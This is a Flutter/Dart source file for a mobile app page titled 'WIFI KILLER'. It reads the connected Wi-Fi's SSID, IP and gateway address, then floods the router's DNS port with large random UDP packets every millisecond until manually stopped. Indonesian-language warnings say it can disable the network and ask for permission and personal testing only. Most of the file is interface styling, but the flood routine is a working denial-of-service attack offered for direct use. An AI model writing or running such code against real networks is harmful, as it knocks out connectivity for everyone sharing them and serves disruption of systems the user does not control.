// lib/wifi_internal.dart
import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'app_theme.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      if (!mounted) return;
      _showAlert("Permission Denied",
          "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      if (!mounted) return;
      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload =
        List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket =
              await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    if (!mounted) return;
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
  }

  void _showAlert(String title, String message) {
    if (!mounted) return;
    final C = AppTheme.current.value;
    final isComic = AppTheme.currentStyle.value == ThemeStyle.comic3d;

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: C.bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(isComic ? 20 : 16),
          side: BorderSide(
            color: isComic ? Colors.black : C.accent,
            width: isComic ? 3.5 : 1.5,
          ),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: isComic ? C.comicText : C.accent,
            fontFamily: isComic ? 'Bangers' : 'Orbitron',
            fontWeight: FontWeight.w900,
            fontSize: isComic ? 18 : 15,
            letterSpacing: isComic ? 1.5 : 2,
          ),
        ),
        content: Text(
          message,
          style: TextStyle(
            color: isComic ? C.comicTextSub : C.textSub,
            fontFamily: isComic ? 'ComicNeue' : 'ShareTechMono',
            fontSize: 12,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              "OK",
              style: TextStyle(
                color: C.accent,
                fontFamily: isComic ? 'Bangers' : 'Orbitron',
                fontWeight: FontWeight.w900,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // BUILDERS
  // ═══════════════════════════════════════════════════════════
  Widget _buildGlassCard({
    required AppPalette C,
    required bool isComic,
    required Widget child,
    EdgeInsetsGeometry? padding,
  }) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: padding ?? const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: isComic ? C.bgDark : null,
        gradient: isComic
            ? null
            : LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [C.bg, C.bgDark, C.bgDeep],
              ),
        borderRadius: BorderRadius.circular(isComic ? 20 : 16),
        border: Border.all(
          color: isComic ? Colors.black : C.accent.withOpacity(0.4),
          width: isComic ? 4 : 1.5,
        ),
        boxShadow: isComic
            ? const [
                BoxShadow(
                    color: Colors.black, offset: Offset(5, 5), blurRadius: 0),
              ]
            : [
                BoxShadow(
                  color: C.accent.withOpacity(0.18),
                  blurRadius: 22,
                  spreadRadius: 2,
                ),
              ],
      ),
      child: child,
    );
  }

  Widget _buildInfoRow(AppPalette C, bool isComic, String label, String value) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 4),
      padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 12),
      decoration: BoxDecoration(
        color: C.bgDeep,
        borderRadius: BorderRadius.circular(isComic ? 10 : 8),
        border: Border.all(
          color: isComic ? Colors.black : C.accent.withOpacity(0.25),
          width: isComic ? 2.5 : 1,
        ),
      ),
      child: Row(
        children: [
          Text(
            "$label: ",
            style: TextStyle(
              color: C.accent,
              fontWeight: FontWeight.w900,
              fontSize: 12,
              fontFamily: isComic ? 'Bangers' : 'Orbitron',
              letterSpacing: isComic ? 1 : 1.2,
            ),
          ),
          Expanded(
            child: Text(
              value,
              textAlign: TextAlign.right,
              style: TextStyle(
                color: isComic ? C.comicText : C.text,
                fontWeight: FontWeight.w700,
                fontSize: 12,
                fontFamily: isComic ? 'ComicNeue' : 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton({
    required AppPalette C,
    required bool isComic,
    required String text,
    required IconData icon,
    required VoidCallback onPressed,
    required Color color,
  }) {
    final textColor = isComic ? C.contrastTextOn(color) : Colors.white;
    final outline = textColor == Colors.white ? Colors.black : Colors.white;

    return GestureDetector(
      onTap: onPressed,
      child: Container(
        height: 58,
        padding: const EdgeInsets.symmetric(horizontal: 24),
        decoration: BoxDecoration(
          color: isComic ? color : null,
          gradient: isComic
              ? null
              : LinearGradient(
                  colors: [color, color.withOpacity(0.7)],
                ),
          borderRadius: BorderRadius.circular(isComic ? 14 : 16),
          border: Border.all(
            color: isComic ? Colors.black : color.withOpacity(0.8),
            width: isComic ? 3.5 : 1.5,
          ),
          boxShadow: isComic
              ? const [
                  BoxShadow(
                      color: Colors.black,
                      offset: Offset(5, 5),
                      blurRadius: 0),
                ]
              : [
                  BoxShadow(
                    color: color.withOpacity(0.4),
                    blurRadius: 15,
                    spreadRadius: 2,
                  ),
                ],
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: textColor, size: 22),
            const SizedBox(width: 10),
            Text(
              text,
              style: TextStyle(
                color: textColor,
                fontWeight: FontWeight.w900,
                fontSize: isComic ? 16 : 14,
                fontFamily: isComic ? 'Bangers' : 'Orbitron',
                letterSpacing: isComic ? 1.2 : 2,
                shadows: isComic
                    ? [
                        Shadow(
                          color: outline,
                          offset: const Offset(1.5, 1.5),
                          blurRadius: 0,
                        ),
                      ]
                    : null,
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _loopTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<AppPalette>(
      valueListenable: AppTheme.current,
      builder: (context, C, _) {
        return ValueListenableBuilder<ThemeStyle>(
          valueListenable: AppTheme.currentStyle,
          builder: (context, style, __) {
            final isComic = style == ThemeStyle.comic3d;

            return Scaffold(
              backgroundColor: C.bgDeep,
              body: Stack(
                children: [
                  if (!isComic) ...[
                    Positioned(
                      top: -100,
                      right: -100,
                      child: Container(
                        width: 300,
                        height: 300,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              C.accent.withOpacity(0.1),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    ),
                  ],
                  Container(
                    decoration: BoxDecoration(
                      gradient: isComic
                          ? null
                          : LinearGradient(
                              colors: [C.bg, C.bgDark, C.bgDeep],
                              begin: Alignment.topCenter,
                              end: Alignment.bottomCenter,
                            ),
                      color: isComic ? C.bg : null,
                    ),
                  ),
                  SafeArea(
                    child: SingleChildScrollView(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          _buildGlassCard(
                            C: C,
                            isComic: isComic,
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.wifi_off,
                                    color: C.accent, size: 28),
                                const SizedBox(width: 12),
                                Text(
                                  "WIFI KILLER",
                                  style: TextStyle(
                                    fontSize: isComic ? 20 : 18,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: isComic ? 2 : 3,
                                    color: isComic ? C.comicText : C.text,
                                    fontFamily:
                                        isComic ? 'Bangers' : 'Orbitron',
                                    shadows: isComic
                                        ? [
                                            Shadow(
                                              color: C.comicTextOutline,
                                              offset: const Offset(2, 2),
                                              blurRadius: 0,
                                            ),
                                          ]
                                        : null,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 16),
                          _buildGlassCard(
                            C: C,
                            isComic: isComic,
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Row(
                                  children: [
                                    Icon(Icons.warning,
                                        color: C.primaryHi, size: 18),
                                    const SizedBox(width: 8),
                                    Text(
                                      "Warning",
                                      style: TextStyle(
                                        color: C.primaryHi,
                                        fontSize: isComic ? 16 : 14,
                                        fontWeight: FontWeight.w900,
                                        fontFamily: isComic
                                            ? 'Bangers'
                                            : 'Orbitron',
                                        letterSpacing: 1,
                                      ),
                                    ),
                                  ],
                                ),
                                const SizedBox(height: 10),
                                Text(
                                  "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n\n⚠️ Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
                                  style: TextStyle(
                                    color: isComic
                                        ? C.comicTextSub
                                        : C.text.withOpacity(0.7),
                                    fontSize: 11,
                                    height: 1.5,
                                    fontFamily: isComic
                                        ? 'ComicNeue'
                                        : 'ShareTechMono',
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 16),
                          _buildGlassCard(
                            C: C,
                            isComic: isComic,
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Row(
                                  children: [
                                    Icon(Icons.network_wifi,
                                        color: C.accent, size: 20),
                                    const SizedBox(width: 10),
                                    Text(
                                      "Network Information",
                                      style: TextStyle(
                                        fontSize: isComic ? 16 : 13,
                                        fontWeight: FontWeight.w900,
                                        color: isComic
                                            ? C.comicText
                                            : C.text,
                                        fontFamily: isComic
                                            ? 'Bangers'
                                            : 'Orbitron',
                                        letterSpacing: 1,
                                      ),
                                    ),
                                  ],
                                ),
                                const SizedBox(height: 12),
                                _buildInfoRow(C, isComic, "SSID", ssid),
                                _buildInfoRow(C, isComic, "IP Address", ip),
                                _buildInfoRow(
                                    C, isComic, "Frequency", "$frequency MHz"),
                                _buildInfoRow(
                                    C, isComic, "Router IP", routerIp),
                              ],
                            ),
                          ),
                          const SizedBox(height: 24),
                          Center(
                            child: _buildActionButton(
                              C: C,
                              isComic: isComic,
                              text: isKilling ? "STOP ATTACK" : "START KILL",
                              icon:
                                  isKilling ? Icons.stop : Icons.wifi_off,
                              onPressed:
                                  isKilling ? _stopFlood : _startFlood,
                              color:
                                  isKilling ? C.primaryLo : C.primaryHi,
                            ),
                          ),
                          const SizedBox(height: 16),
                          if (isKilling)
                            Center(
                              child: Column(
                                children: [
                                  const SizedBox(height: 12),
                                  SizedBox(
                                    width: 60,
                                    height: 60,
                                    child: CircularProgressIndicator(
                                      color: C.accent,
                                      strokeWidth: 3,
                                    ),
                                  ),
                                  const SizedBox(height: 12),
                                  Text(
                                    "Attack in progress...",
                                    style: TextStyle(
                                      color: C.accent,
                                      fontSize: isComic ? 14 : 12,
                                      fontWeight: FontWeight.w900,
                                      fontFamily: isComic
                                          ? 'Bangers'
                                          : 'Orbitron',
                                      letterSpacing: 1.5,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          const SizedBox(height: 16),
                          _buildGlassCard(
                            C: C,
                            isComic: isComic,
                            padding: const EdgeInsets.all(14),
                            child: Row(
                              children: [
                                Icon(Icons.info, color: C.accent, size: 16),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: Text(
                                    "Pastikan Anda memiliki izin sebelum menggunakan tool ini",
                                    style: TextStyle(
                                      color: isComic
                                          ? C.comicTextSub
                                          : C.textSub,
                                      fontSize: 11,
                                      fontFamily: isComic
                                          ? 'ComicNeue'
                                          : 'ShareTechMono',
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            );
          },
        );
      },
    );
  }
}